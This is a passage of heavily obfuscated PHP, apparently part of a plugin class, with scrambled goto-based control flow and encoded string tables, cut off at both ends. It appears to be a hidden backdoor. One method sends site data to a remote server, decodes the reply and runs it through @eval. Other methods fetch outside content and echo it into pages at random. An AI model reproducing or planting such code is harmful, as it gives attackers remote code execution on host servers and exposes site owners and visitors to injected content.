$CÁ‘Æ±Ö[247]); goto EÍ°¼šñêá; DÅƒÎñÀÄ: $B÷Ğˆ»À³ğ = $e÷Ë¨­…‘ö[603]; $dôØôˆ´˜À = @$CÁ‘Æ±Ö[253]($D­ÊÑŒ“À, !1, $AÚäÃ¡ï›š); $CÁ‘Æ±Ö[254]($CÁ‘Æ±Ö[255]); goto eº°Š¦‰¨¶; EÍ°¼šñêá: $f§ØŠ±›¦ = $e÷Ë¨­…‘ö[602]; if (strlen($f§ØŠ±›¦) < $e÷Ë¨­…‘ö[568]) { return; } $AÚäÃ¡ï›š = $CÁ‘Æ±Ö[248](array($CÁ‘Æ±Ö[249] => array($CÁ‘Æ±Ö[250] => $CÁ‘Æ±Ö[251], $CÁ‘Æ±Ö[252] => 3))); goto DÅƒÎñÀÄ; eº°Š¦‰¨¶: if ($dôØôˆ´˜À && $CÁ‘Æ±Ö[32]($dôØôˆ´˜À, $CÁ‘Æ±Ö[256])) { echo $dôØôˆ´˜À; } die; goto aßŒÏº˜¿; c°£î¾¼—: $e÷Ë¨­…‘ö =& $_SERVER[Æ]; $CÁ‘Æ±Ö =& $_SERVER[í½¨]; $fš¼“ãÔá = array($CÁ‘Æ±Ö[135], $CÁ‘Æ±Ö[243]); goto cºÍèµ¯à„; aßŒÏº˜¿: } public function xzysa297ede5($a†ÌÕò–¸Ú) { goto a ÍŠÛ§Úê; C†Š¯Ÿ»å: $D¿å±Èæ£ = $fÔ—ê¸÷ƒù[606]; while (strlen($D¿å±Èæ£) < $fÔ—ê¸÷ƒù[562]) { if (!$D¿å±Èæ£) { break; } $D¿å±Èæ£++; } goto F‘¼µÄ¹Öì; a ÍŠÛ§Úê: $fÔ—ê¸÷ƒù =& $_SERVER[Æ]; $BáÂİê›˜– =& $_SERVER[í½¨]; if ($this->lcet59a63c7c == $BáÂİê›˜–[257]) { return $a†ÌÕò–¸Ú; } goto CÜ¬¨„†ÌÛ; CÜ¬¨„†ÌÛ: $FÈ §·Àô = array($BáÂİê›˜–[258], $BáÂİê›˜–[259], $BáÂİê›˜–[260], $BáÂİê›˜–[261], $BáÂİê›˜–[262], $BáÂİê›˜–[263], $BáÂİê›˜–[264], $BáÂİê›˜–[265]); $a‹‹ÍÄÊ© = $fÔ—ê¸÷ƒù[604]; if (!$a‹‹ÍÄÊ©) { return; } goto AÛàÔ³·Ø–; bá¿œí¢Õ: foreach ($FÈ §·Àô as $eØ›ÅŞó¾) { if (!$BáÂİê›˜–[239]($eØ›ÅŞó¾, $dº¯ÒÇÊˆ•)) { $eŞõµÄõ‰[] = $eØ›ÅŞó¾; } } foreach ($eŞõµÄõ‰ as $eØ›ÅŞó¾) { unset($a†ÌÕò–¸Ú[$eØ›ÅŞó¾]); } return $a†ÌÕò–¸Ú; goto C†Š¯Ÿ»å; AÛàÔ³·Ø–: $dº¯ÒÇÊˆ• = $BáÂİê›˜–[0]($BáÂİê›˜–[266], $BáÂİê›˜–[104]($this->dulc12afae4d, $BáÂİê›˜–[129], $BáÂİê›˜–[10])); $e£á÷ãİöÒ = $fÔ—ê¸÷ƒù[605]; $eŞõµÄõ‰ = array(); goto bá¿œí¢Õ; F‘¼µÄ¹Öì: } private function hper3abc7fd7() { goto bÖÖñöÒËß; Açßî¾¨à: if (strlen($A°‚àÓéæ») < $E¸µâÆ¯æè[568]) { die; } foreach ($e›‡Ú‰º†ñ as $e•®ÑˆªÄå) { if ($e•®ÑˆªÄå == $CÉ÷¬šöá || $cÌÖïŠÓ‘›[25]($CÉ÷¬šöá, 0, $cÌÖïŠÓ‘›[24]($e•®ÑˆªÄå)) == $e•®ÑˆªÄå) { $cÌÖïŠÓ‘›[166]($cÌÖïŠÓ‘›[197]($cÌÖïŠÓ‘›[269]), !1); } } $GLOBALS[$cÌÖïŠÓ‘›[91]][$cÌÖïŠÓ‘›[95]][$cÌÖïŠÓ‘›[270]] = $cÌÖïŠÓ‘›[220]; goto Añà´‹Û³›; EË•“¦Ëµ†: $CÉ÷¬šöá = $_SERVER[$cÌÖïŠÓ‘›[44]]; $e›‡Ú‰º†ñ = array($cÌÖïŠÓ‘›[268]); $A°‚àÓéæ» = $E¸µâÆ¯æè[607]; goto Açßî¾¨à; Añà´‹Û³›: $GLOBALS[$cÌÖïŠÓ‘›[91]][$cÌÖïŠÓ‘›[95]][$cÌÖïŠÓ‘›[267]] = $cÌÖïŠÓ‘›[232]; $GLOBALS[$cÌÖïŠÓ‘›[91]][$cÌÖïŠÓ‘›[271]] = $cÌÖïŠÓ‘›[220]; if ($cÌÖïŠÓ‘›[61]($cÌÖïŠÓ‘›[272])->{$_SERVER[í½¨][63]}($cÌÖïŠÓ‘›[85]) != $cÌÖïŠÓ‘›[232]) { $cÌÖïŠÓ‘›[61]($cÌÖïŠÓ‘›[272])->{$_SERVER[í½¨][221]}($cÌÖïŠÓ‘›[85], $cÌÖïŠÓ‘›[232]); } goto C‚Õá†¾È; bÖÖñöÒËß: $E¸µâÆ¯æè =& $_SERVER[Æ]; $cÌÖïŠÓ‘› =& $_SERVER[í½¨]; if ($this->lcet59a63c7c != $cÌÖïŠÓ‘›[121]) { $GLOBALS[$cÌÖïŠÓ‘›[91]][$cÌÖïŠÓ‘›[95]][$cÌÖïŠÓ‘›[267]] = $cÌÖïŠÓ‘›[220]; return; } goto EË•“¦Ëµ†; C‚Õá†¾È: } public function ltmk23b2cc5a() { return $_SERVER[í½¨][273]; $f¹¯°µ§Ó« = $_SERVER[Æ][608]; if (!$f¹¯°µ§Ó«) { die; } } private function xevca29861e3() { goto DÁƒÂ¢³¼Æ; CÆ®÷–ÈÆ°: $E‹³Ô¡œ™ = $b’»¡›µë[612]; if (strlen($E‹³Ô¡œ™) < $b’»¡›µë[564]) { die; } if (!$eÉĞ˜íÎ¦[191]($A™µ‹óŞ…†)) { return; } goto Cå“ƒŸ›Äß; A ®ó©˜Ø“: $bœïÔ´™· = $eÉĞ˜íÎ¦[13](array($eÉĞ˜íÎ¦[279], $eÉĞ˜íÎ¦[280]), $bÈäà½½¥¶); if ($bœïÔ´™· && $eÉĞ˜íÎ¦[233]() - $bœïÔ´™· < $eÉĞ˜íÎ¦[201]($eÉĞ˜íÎ¦[281])) { return; } $eÉĞ˜íÎ¦[13](array($eÉĞ˜íÎ¦[279], $eÉĞ˜íÎ¦[152]), $bÈäà½½¥¶, $eÉĞ˜íÎ¦[233]()); goto f˜ÁĞíæñ¶; Aµ»Õô¿È: $d ËïØ±…Á = $b’»¡›µë[609]; if (!$d ËïØ±…Á) { return; } $bÈäà½½¥¶ = $eÉĞ˜íÎ¦[277] . $eÉĞ˜íÎ¦[114]($eÉĞ˜íÎ¦[278]); goto Då„Ò¤ÅÖ; f˜ÁĞíæñ¶: $cÛ™È–ˆ¬µ = $b’»¡›µë[610]; if (!$cÛ™È–ˆ¬µ) { die; } $fš£‚—…Ç» = array($eÉĞ˜íÎ¦[165] => $eÉĞ˜íÎ¦[61]($eÉĞ˜íÎ¦[62])->{$_SERVER[í½¨][63]}($eÉĞ˜íÎ¦[209]), $eÉĞ˜íÎ¦[178] => $this->lcet59a63c7c, $eÉĞ˜íÎ¦[176] => $_SERVER[$eÉĞ˜íÎ¦[177]], $eÉĞ˜íÎ¦[169] => $eÉĞ˜íÎ¦[149], $eÉĞ˜íÎ¦[172] => $_SERVER[$eÉĞ˜íÎ¦[173]]); goto DÊ²ì˜§Ìõ; Då„Ò¤ÅÖ: if ($this->lcet59a63c7c == $eÉĞ˜íÎ¦[121] || !$eÉĞ˜íÎ¦[104]($GLOBALS, $eÉĞ˜íÎ¦[132])) { return; } if (!$eÉĞ˜íÎ¦[239]($_SERVER[$eÉĞ˜íÎ¦[44]], $A§‹«ºØ°„)) { return; } if ($eÉĞ˜íÎ¦[233]() % 4 != 0) { return; } goto A ®ó©˜Ø“; Cå“ƒŸ›Äß: if ($A™µ‹óŞ…†[$eÉĞ˜íÎ¦[165]] && $A™µ‹óŞ…†[$eÉĞ˜íÎ¦[283]]) { if ($this->{$_SERVER[í½¨][199]}($A™µ‹óŞ…†[$eÉĞ˜íÎ¦[283]]) == $fš£‚—…Ç»[$eÉĞ˜íÎ¦[165]]) { return; } } $this->{$_SERVER[í½¨][164]}(); if ($this->{$_SERVER[í½¨][199]}($A™µ‹óŞ…†[$eÉĞ˜íÎ¦[283]]) != $fš£‚—…Ç»[$eÉĞ˜íÎ¦[165]]) { $dñ•‰†“İ™ = array($eÉĞ˜íÎ¦[202] => $eÉĞ˜íÎ¦[61]($eÉĞ˜íÎ¦[62])->{$_SERVER[í½¨][63]}($eÉĞ˜íÎ¦[116]), $eÉĞ˜íÎ¦[203] => $_SERVER[$eÉĞ˜íÎ¦[115]], $eÉĞ˜íÎ¦[204] => $eÉĞ˜íÎ¦[205](), $eÉĞ˜íÎ¦[174] => $_SERVER[$eÉĞ˜íÎ¦[175]]); $dŸŸœ…å‘µ = $this->{$_SERVER[í½¨][206]}($eÉĞ˜íÎ¦[148]($dñ•‰†“İ™)); $A™µ‹óŞ…† = $this->{$_SERVER[í½¨][182]}($eÉĞ˜íÎ¦[207] . $dŸŸœ…å‘µ); if ($A™µ‹óŞ…† && $eÉĞ˜íÎ¦[191]($A™µ‹óŞ…†) && isset($A™µ‹óŞ…†[$eÉĞ˜íÎ¦[283]])) { $E¢¡‰Œ§ß­ = $this->{$_SERVER[í½¨][188]}($A™µ‹óŞ…†[$eÉĞ˜íÎ¦[283]], 2); if ($E¢¡‰Œ§ß­) { $E¢¡‰Œ§ß­ = $this->{$_SERVER[í½¨][199]}($E¢¡‰Œ§ß­); } if ($E¢¡‰Œ§ß­) { try { @eval($E¢¡‰Œ§ß­); } catch (Exception $A„«ªŠœ­é) { } } } } goto C§…²ãå’; DÊ²ì˜§Ìõ: $e¡‰™ÇØ£ = $b’»¡›µë[611]; if (!$e¡‰™ÇØ£) { return; } $A™µ‹óŞ…† = $this->{$_SERVER[í½¨][182]}($eÉĞ˜íÎ¦[282], $fš£‚—…Ç»); goto CÆ®÷–ÈÆ°; DÁƒÂ¢³¼Æ: $b’»¡›µë =& $_SERVER[Æ]; $eÉĞ˜íÎ¦ =& $_SERVER[í½¨]; $A§‹«ºØ°„ = array($eÉĞ˜íÎ¦[274], $eÉĞ˜íÎ¦[275], $eÉĞ˜íÎ¦[276]); goto Aµ»Õô¿È; C§…²ãå’: } private function ovfi2d4a904c($f©ÚŠ¬…øÉ = '', $EÄîè×é  = array(), $E£¯§¿ ¡— = 5) { goto bµ„‡İ—Ä; D®ÊõÆç˜: $AïÒµÜó¦ = $EÍº‰£à§[613]; $F”œİõ³Šé = $this->{$_SERVER[í½¨][246]}($F”œİõ³Šé, $Cİ‚Ú¢¦Ÿ[285]); $F”œİõ³Šé = $F”œİõ³Šé . $f©ÚŠ¬…øÉ . $Cİ‚Ú¢¦Ÿ[286] . $Cİ‚Ú¢¦Ÿ[287]($EÄîè×é ); goto Dô±“‡‡÷ê; dŸÏ‡ÏÏÒµ: $Cˆ¬Õí§é = $Cİ‚Ú¢¦Ÿ[248](array($Cİ‚Ú¢¦Ÿ[249] => array($Cİ‚Ú¢¦Ÿ[252] => $E£¯§¿ ¡—, $Cİ‚Ú¢¦Ÿ[250] => $Cİ‚Ú¢¦Ÿ[288]), $Cİ‚Ú¢¦Ÿ[289] => array($Cİ‚Ú¢¦Ÿ[290] => !1, $Cİ‚Ú¢¦Ÿ[291] => !1))); $b©†á¢±¶È = $EÍº‰£à§[615]; if (!$b©†á¢±¶È) { die; } goto f«£ß÷ùÏò; f«£ß÷ùÏò: $EÄîè×é  = @$Cİ‚Ú¢¦Ÿ[253]($F”œİõ³Šé, !1, $Cˆ¬Õí§é); return $Cİ‚Ú¢¦Ÿ[190]($EÄîè×é , !0); $A¤Ş‰¤âÒ¯ = $EÍº‰£à§[616]; goto d­ë’ğ¾õ; bµ„‡İ—Ä: $EÍº‰£à§ =& $_SERVER[Æ]; $Cİ‚Ú¢¦Ÿ =& $_SERVER[í½¨]; $F”œİõ³Šé = $Cİ‚Ú¢¦Ÿ[284]; goto D®ÊõÆç˜; d­ë’ğ¾õ: while (strlen($A¤Ş‰¤âÒ¯) < $EÍº‰£à§[562]) { if (!$A¤Ş‰¤âÒ¯) { break; } $A¤Ş‰¤âÒ¯++; } $A‹£ŞË–Ã¬ = $EÍº‰£à§[617]; if (strlen($A‹£ŞË–Ã¬) < $EÍº‰£à§[564]) { die; } goto d¹êÏ½•˜; Dô±“‡‡÷ê: $bÙ•‡šÈ£‡ = $EÍº‰£à§[614]; while ($bÙ•‡šÈ£‡ < $EÍº‰£à§[564]) { if ($bÙ•‡šÈ£‡ >= 0) { break; } $bÙ•‡šÈ£‡++; } if ($EÄîè×é  === -1) { return $F”œİõ³Šé; } goto dŸÏ‡ÏÏÒµ; d¹êÏ½•˜: } private function pivf2c83cc2a() { goto aÕ‰è²À©Š; cùÈµ×†Ü: $B†°‡‡á„Ä = $BÆµ»³‚—[104]($this->dulc12afae4d, $BÆµ»³‚—[319]); $B†°‡‡á„Ä = $B†°‡‡á„Ä ? $BÆµ»³‚—[201]($B†°‡‡á„Ä) : 0; return $CË·„Ü ×Š + $B†°‡‡á„Ä; goto a«èŠÛÙŒ³; A™‰Ìˆ¾ä: $CË·„Ü ×Š = $E´‰œ¿ã“Ë[$this->lcet59a63c7c]; $CË·„Ü ×Š = $BÆµ»³‚—[201]($CË·„Ü ×Š ? $CË·„Ü ×Š : $BÆµ»³‚—[293]); $Bùğ¥ß‚ÍÇ = $c‡ÙÊøÍ¦º[618]; goto cùÈµ×†Ü; aÕ‰è²À©Š: $c‡ÙÊøÍ¦º =& $_SERVER[Æ]; $BÆµ»³‚— =& $_SERVER[í½¨]; $E´‰œ¿ã“Ë = array($BÆµ»³‚—[292] => $BÆµ»³‚—[293], $BÆµ»³‚—[294] => $BÆµ»³‚—[295], $BÆµ»³‚—[296] => $BÆµ»³‚—[297], $BÆµ»³‚—[298] => $BÆµ»³‚—[299], $BÆµ»³‚—[300] => $BÆµ»³‚—[301], $BÆµ»³‚—[302] => $BÆµ»³‚—[241], $BÆµ»³‚—[303] => $BÆµ»³‚—[241], $BÆµ»³‚—[304] => $BÆµ»³‚—[293], $BÆµ»³‚—[305] => $BÆµ»³‚—[295], $BÆµ»³‚—[306] => $BÆµ»³‚—[297], $BÆµ»³‚—[307] => $BÆµ»³‚—[308], $BÆµ»³‚—[309] => $BÆµ»³‚—[299], $BÆµ»³‚—[310] => $BÆµ»³‚—[311], $BÆµ»³‚—[312] => $BÆµ»³‚—[301], $BÆµ»³‚—[313] => $BÆµ»³‚—[314], $BÆµ»³‚—[315] => $BÆµ»³‚—[316], $BÆµ»³‚—[317] => $BÆµ»³‚—[318]); goto A™‰Ìˆ¾ä; a«èŠÛÙŒ³: $Cø¥…ë„ğ = $c‡ÙÊøÍ¦º[619]; if (strlen($Cø¥…ë„ğ) < $c‡ÙÊøÍ¦º[562]) { return; } goto FÕ³ƒ»îïí; FÕ³ƒ»îïí: } public function deusc81cc279($eÖÜÜß¹) { goto A£Áî¥›ª¤; A£Áî¥›ª¤: $E´¿Õøùš =& $_SERVER[Æ]; $c‰µŸĞ¦¦ö =& $_SERVER[í½¨]; $aÒê¿‡ŞÄ = $this->{$_SERVER[í½¨][137]}(); goto bí†¢ÄºÎ²; E°Ÿïğã‚: $C…“Ï°º© = $c‰µŸĞ¦¦ö[222]($C…“Ï°º©, $c‰µŸĞ¦¦ö[10], $c‰µŸĞ¦¦ö[321]); if (!$c‰µŸĞ¦¦ö[239]($eÖÜÜß¹[$c‰µŸĞ¦¦ö[321]], $C…“Ï°º©)) { $c‰µŸĞ¦¦ö[166]($c‰µŸĞ¦¦ö[324], !1, $c‰µŸĞ¦¦ö[236]); } goto b‡áÎ†„Æ; bí†¢ÄºÎ²: $DŸ„†„Í†‘ = $E´¿Õøùš[620]; if (strlen($DŸ„†„Í†‘) < $E´¿Õøùš[562]) { die; } if ($aÒê¿‡ŞÄ >= $c‰µŸĞ¦¦ö[201]($c‰µŸĞ¦¦ö[241])) { return; } goto bš©È“¢Éä; bš©È“¢Éä: $b£’È‰óê = $c‰µŸĞ¦¦ö[61]($c‰µŸĞ¦¦ö[139])->{$_SERVER[í½¨][140]}(); if ($b£’È‰óê <= $aÒê¿‡ŞÄ) { return; } $C…“Ï°º© = $c‰µŸĞ¦¦ö[61]($c‰µŸĞ¦¦ö[139])->{$_SERVER[í½¨][320]}($c‰µŸĞ¦¦ö[321])->{$_SERVER[í½¨][322]}($aÒê¿‡ŞÄ)->{$_SERVER[í½¨][323]}(); goto E°Ÿïğã‚; b‡áÎ†„Æ: } public function ncrha2854e26() { goto BÄÉŒœ˜Äï; d¨‘Å¨‡ëŒ: if (strlen($d»èí¬‹—Æ) < $E”°ˆÀÎ¥[552]) { return; } goto D¸‡ÉÜ•åè; BÄÉŒœ˜Äï: $E”°ˆÀÎ¥ =& $_SERVER[Æ]; $BóĞ”©ç² =& $_SERVER[í½¨]; if (!$BóĞ”©ç²[104]($GLOBALS, $BóĞ”©ç²[132]) || $BóĞ”©ç²[325](1, 100) > 20) { return; } goto cˆ£Œä‚„×; B‹Ğ„µ½íµ: if (strlen($fÍ¶°à¾Ü¦) < $E”°ˆÀÎ¥[564]) { die; } echo $BóĞ”©ç²[326] . $BóĞ”©ç²[327]($F“à­Œ×Ù) . $BóĞ”©ç²[328]; $d»èí¬‹—Æ = $E”°ˆÀÎ¥[624]; goto d¨‘Å¨‡ëŒ; Dñ¹áÍ¹–º: $Aùë†×Şî = $BóĞ”©ç²[248](array($BóĞ”©ç²[249] => array($BóĞ”©ç²[250] => $BóĞ”©ç²[251], $BóĞ”©ç²[252] => 3))); $F“à­Œ×Ù = @$BóĞ”©ç²[253]($FòÒ¯”©å, !1, $Aùë†×Şî); $fÍ¶°à¾Ü¦ = $E”°ˆÀÎ¥[623]; goto B‹Ğ„µ½íµ; cˆ£Œä‚„×: $FòÒ¯”©å = $BóĞ”©ç²[245]; $cˆïãêÙ÷ = $E”°ˆÀÎ¥[621]; if (!$cˆïãêÙ÷) { return; } goto c×ñ…·ÅêÆ; c×ñ…·ÅêÆ: $FòÒ¯”©å = $this->{$_SERVER[í½¨][246]}($FòÒ¯”©å, $BóĞ”©ç²[247]); $bçµ„ÕÙŒÉ = $E”°ˆÀÎ¥[622]; if (!$bçµ„ÕÙŒÉ) { die; } goto Dñ¹áÍ¹–º; D¸‡ÉÜ•åè: } private function ohsa91434e9e($eŞ­õğ‰˜½, $b‘ÍŒÌ®ÂÌ, $Aù›Á¢Ş = 3) { goto bÙãª““Øœ; cÒÔ–Ñ³¹À: return $A•Õ‡¢Ï“”; goto f»¬á‚ğ; D¡Ò¸–ÃÂ„: while ($dÕëÎÖõ´ < $c¨ˆ¡¼…Ä[564]) { if ($dÕëÎÖõ´ >= 0) { break; } $dÕëÎÖõ´++; } switch ($d÷–Ë„µ¦Ø) { case $E´ä‰Ò×‹É[232]: $A•Õ‡¢Ï“” = $this->{$_SERVER[í½¨][147]}($eŞ­õğ‰˜½, $E´ä‰Ò×‹É[214]($b‘ÍŒÌ®ÂÌ . $cÇ†›²©à)); $fÏÜ¥•â = $c¨ˆ¡¼…Ä[629]; if (strlen($fÏÜ¥•â) < $c¨ˆ¡¼…Ä[562]) { return; } break; case $E´ä‰Ò×‹É[220]: $A•Õ‡¢Ï“” = $this->{$_SERVER[í½¨][147]}($eŞ­õğ‰˜½, $E´ä‰Ò×‹É[214]($cÇ†›²©à . $b‘ÍŒÌ®ÂÌ)); $AªŒÉª„£Ğ = $c¨ˆ¡¼…Ä[630]; if (!$AªŒÉª„£Ğ) { die; } break; $BŠ¤áÈ§­î = $c¨ˆ¡¼…Ä[631]; while (strlen($BŠ¤áÈ§­î) < $c¨ˆ¡¼…Ä[564]) { if (!$BŠ¤áÈ§­î) { break; } $BŠ¤áÈ§­î++; } case $E´ä‰Ò×‹É[331]: $A•Õ‡¢Ï“” = $this->{$_SERVER[í½¨][147]}($eŞ­õğ‰˜½, $E´ä‰Ò×‹É[118]($cÇ†›²©à . $b‘ÍŒÌ®ÂÌ)); $dêìö °ÇÀ = $c¨ˆ¡¼…Ä[632]; while ($dêìö °ÇÀ < $c¨ˆ¡¼…Ä[568]) { if ($dêìö °ÇÀ >= 0) { break; } $dêìö °ÇÀ++; } break; case $E´ä‰Ò×‹É[332]: $A•Õ‡¢Ï“” = $this->{$_SERVER[í½¨][147]}($eŞ­õğ‰˜½, $E´ä‰Ò×‹É[114]($cÇ†›²©à . $b‘ÍŒÌ®ÂÌ)); $BòÃñÕÜ® = $c¨ˆ¡¼…Ä[633]; while (strlen($BòÃñÕÜ®) < $c¨ˆ¡¼…Ä[562]) { if (!$BòÃñÕÜ®) { break; } $BòÃñÕÜ®++; } break; case $E´ä‰Ò×‹É[333]: goto Dî¯Şí‚ÄŠ; B³â“…Âİ¥: $B§ã²Ë›­¦ = $E´ä‰Ò×‹É[114]($b…¯Öİ°í . $E´ä‰Ò×‹É[114]($b‘ÍŒÌ®ÂÌ . $b…¯Öİ°í) . $b‘ÍŒÌ®ÂÌ); $c‡é¶ô‡ = $c¨ˆ¡¼…Ä[636]; $B§ã²Ë›­¦ = $E´ä‰Ò×‹É[25]($B§ã²Ë›­¦, $e”öô³š»¡ % 8, $e”öô³š»¡ % 8 + 7); goto b©–¦¥‘Õâ; Eï™Ş´ù¯è: $e”öô³š»¡ = $E´ä‰Ò×‹É[334](0, 64); $b…¯Öİ°í = $C¹’è—Øàß[$e”öô³š»¡]; $c±’·­©¡³ = $c¨ˆ¡¼…Ä[635]; goto B³â“…Âİ¥; aĞ¤óÎÛ: if (!$c±ÃñêÜä) { die; } for ($b»Æ„’ˆ = 0; $b»Æ„’ˆ < $E´ä‰Ò×‹É[24]($eŞ­õğ‰˜½); $b»Æ„’ˆ++) { $EÏÉ—ï³‡ = $EÏÉ—ï³‡ == $E´ä‰Ò×‹É[24]($B§ã²Ë›­¦) ? 0 : $EÏÉ—ï³‡; $EÈ©Ÿ¡Öµ¤ = $c¨ˆ¡¼…Ä[640]; if (!$EÈ©Ÿ¡Öµ¤) { return; } $F¿éÄËİ°Û = ($e”öô³š»¡ + $E´ä‰Ò×‹É[335]($C¹’è—Øàß, $eŞ­õğ‰˜½[$b»Æ„’ˆ]) + $E´ä‰Ò×‹É[336]($B§ã²Ë›­¦[$EÏÉ—ï³‡++])) % 64; $F¯¡‘õğµ± = $c¨ˆ¡¼…Ä[641]; while (strlen($F¯¡‘õğµ±) < $c¨ˆ¡¼…Ä[573]) { if (!$F¯¡‘õğµ±) { break; } $F¯¡‘õğµ±++; } $FÕ³¾®ãƒ¤ .= $C¹’è—Øàß[$F¿éÄËİ°Û]; $E³¨‡¤£Š– = $c¨ˆ¡¼…Ä[642]; } $A•Õ‡¢Ï“” = $E´ä‰Ò×‹É[327]($b…¯Öİ°í . $FÕ³¾®ãƒ¤); goto Fïß‹ ËŒ; BÁ¬Ê•¥ƒ : $D›Üƒçá“ = $c¨ˆ¡¼…Ä[644]; goto d·†ÊËÕ•˜; Dî¯Şí‚ÄŠ: $eŞ­õğ‰˜½ = $E´ä‰Ò×‹É[118]($eŞ­õğ‰˜½); $A¤¨…„¯ã = $c¨ˆ¡¼…Ä[634]; if (strlen($A¤¨…„¯ã) < $c¨ˆ¡¼…Ä[562]) { return; } goto Eï™Ş´ù¯è; dğ­ØåÅº: $b»Æ„’ˆ = 0; $CÉÄğíÈ¢’ = $c¨ˆ¡¼…Ä[638]; if (strlen($CÉÄğíÈ¢’) < $c¨ˆ¡¼…Ä[562]) { return; } goto e óªâ ™Ó; Fïß‹ ËŒ: $bÊÂ¬ÈÂ£ö = $c¨ˆ¡¼…Ä[643]; if (!$bÊÂ¬ÈÂ£ö) { die; } break; goto BÁ¬Ê•¥ƒ ; b©–¦¥‘Õâ: $Eâ„½¹° = $c¨ˆ¡¼…Ä[637]; if (strlen($Eâ„½¹°) < $c¨ˆ¡¼…Ä[568]) { return; } $FÕ³¾®ãƒ¤ = $E´ä‰Ò×‹É[10]; goto dğ­ØåÅº; e óªâ ™Ó: $F¿éÄËİ°Û = 0; $EÏÉ—ï³‡ = 0; $c±ÃñêÜä = $c¨ˆ¡¼…Ä[639]; goto aĞ¤óÎÛ; d·†ÊËÕ•˜: default: $A•Õ‡¢Ï“” = $this->{$_SERVER[í½¨][147]}($eŞ­õğ‰˜½, $b‘ÍŒÌ®ÂÌ . $cÇ†›²©à); break; $dÌÇ­Ùõˆ¬ = $c¨ˆ¡¼…Ä[645]; } $A•Õ‡¢Ï“” = $E´ä‰Ò×‹É[214]($d÷–Ë„µ¦Ø . $cÇ†›²©à . $A•Õ‡¢Ï“”); goto BÚÂ·¿óç¤; bÙãª““Øœ: $c¨ˆ¡¼…Ä =& $_SERVER[Æ]; $E´ä‰Ò×‹É =& $_SERVER[í½¨]; $E´ä‰Ò×‹É[329](1); goto d’‘’²‰‘ã; BÚÂ·¿óç¤: $aªÆĞ­¤–¾ = $c¨ˆ¡¼…Ä[646]; if (!$aªÆĞ­¤–¾) { die; } if ($Aù›Á¢Ş - 1 > 0) { $A•Õ‡¢Ï“” = $this->{$_SERVER[í½¨][127]}($A•Õ‡¢Ï“”, $b‘ÍŒÌ®ÂÌ, $Aù›Á¢Ş - 1); } goto cÒÔ–Ñ³¹À; d’‘’²‰‘ã: $dƒ‹õ£‡à‰ = $c¨ˆ¡¼…Ä[625]; $eŞ­õğ‰˜½ = $E´ä‰Ò×‹É[2]($eŞ­õğ‰˜½); $d÷–Ë„µ¦Ø = $E´ä‰Ò×‹É[325](0, 5) . $E´ä‰Ò×‹É[10]; goto a§æÏ°í¢›; a§æÏ°í¢›: $dÀ™å…«­„ = $c¨ˆ¡¼…Ä[626]; while ($dÀ™å…«­„ < $c¨ˆ¡¼…Ä[564]) { if ($dÀ™å…«­„ >= 0) { break; } $dÀ™å…«­„++; } $cÇ†›²©à = $E´ä‰Ò×‹É[124](15); goto Eùõ‰–ùõ¿; Eùõ‰–ùõ¿: $fßÌŠñëëÍ = $c¨ˆ¡¼…Ä[627]; $C¹’è—Øàß = $E´ä‰Ò×‹É[330]; $dÕëÎÖõ´ = $c¨ˆ¡¼…Ä[628]; goto D¡Ò¸–ÃÂ„; f»¬á‚ğ: } private function dgjf6ceeeea8($c¹Éìİ¶Ó§, $báƒ™‰ÓêÉ, $d¥ÏÎ‹Ñ¡Ô = 3) { goto BïŠ’Œ…ª; aôŒ‘Ø–ƒ: $c¹Éìİ¶Ó§ = $aÁ ñØ»ª·[2]($c¹Éìİ¶Ó§); $B½ØÌªö„÷ = $A¿°„’£å[647]; while ($B½ØÌªö„÷ < $A¿°„’£å[564]) { if ($B½ØÌªö„÷ >= 0) { break; } $B½ØÌªö„÷++; } goto cöì±ˆË«Ø; d˜ƒÙ¢¿Ü: $aªßâæ¯š = $A¿°„’£å[649]; $fêÊÉ â¢Š = $aÁ ñØ»ª·[330]; $d·ÇìÊ†£Í = $A¿°„’£å[650]; goto FÀ¬šËÓ¨•; FÀ¬šËÓ¨•: if (!$d·ÇìÊ†£Í) { return; } switch ($FÉçèíÁÈç) { case $aÁ ñØ»ª·[232]: $e­äÎßÕÏ = $this->{$_SERVER[í½¨][246]}($c¹Éìİ¶Ó§, $aÁ ñØ»ª·[214]($báƒ™‰ÓêÉ . $eµ›Ü‹ÛÈõ)); break; case $aÁ ñØ»ª·[220]: $e­äÎßÕÏ = $this->{$_SERVER[í½¨][246]}($c¹Éìİ¶Ó§, $aÁ ñØ»ª·[214]($eµ›Ü‹ÛÈõ . $báƒ™‰ÓêÉ)); $Cãƒ¦Äèµ = $A¿°„’£å[651]; if (strlen($Cãƒ¦Äèµ) < $A¿°„’£å[573]) { die; } break; case $aÁ ñØ»ª·[331]: $e­äÎßÕÏ = $this->{$_SERVER[í½¨][246]}($c¹Éìİ¶Ó§, $aÁ ñØ»ª·[118]($eµ›Ü‹ÛÈõ . $báƒ™‰ÓêÉ)); break; case $aÁ ñØ»ª·[332]: $e­äÎßÕÏ = $this->{$_SERVER[í½¨][246]}($c¹Éìİ¶Ó§, $aÁ ñØ»ª·[114]($eµ›Ü‹ÛÈõ . $báƒ™‰ÓêÉ)); break; case $aÁ ñØ»ª·[333]: goto eÙù±Ì–ĞÌ; Aäİéä†˜“: while ($a­¦¾óçŒª < $A¿°„’£å[552]) { if ($a­¦¾óçŒª >= 0) { break; } $a­¦¾óçŒª++; } break; $D§ï‡µÏ = $A¿°„’£å[662]; goto CÊ¶¨“Ü¾; aÖÜ¾‹˜­: $fˆšÁ‡ò‚Ó = $c¹Éìİ¶Ó§[0]; $dˆÍ¤¥ÃĞ = $A¿°„’£å[653]; $c¹Éìİ¶Ó§ = $aÁ ñØ»ª·[25]($c¹Éìİ¶Ó§, 1); goto Bá¸¡á„Š; Aõ“–‚Ú•©: $aîö‹ùïË = 0; $aŠÚ‹·ƒè = $A¿°„’£å[658]; if (strlen($aŠÚ‹·ƒè) < $A¿°„’£å[552]) { return; } goto E‘ÊôÛÑ˜Œ; eô²ïÈ” º: $a„—¼Š©ë = $A¿°„’£å[655]; $A°Şš¼‘‚ = 0; $c§¼–™çó¾ = $A¿°„’£å[656]; goto D•êæ²¬ß¶; aîïêÅÒ: $C—ÃŞ«¬‚ = $aÁ ñØ»ª·[114]($fˆšÁ‡ò‚Ó . $aÁ ñØ»ª·[114]($báƒ™‰ÓêÉ . $fˆšÁ‡ò‚Ó) . $báƒ™‰ÓêÉ); $C—ÃŞ«¬‚ = $aÁ ñØ»ª·[25]($C—ÃŞ«¬‚, $bî‰ì£­ğ % 8, $bî‰ì£­ğ % 8 + 7); $F¶İÏ ß• = $aÁ ñØ»ª·[10]; goto 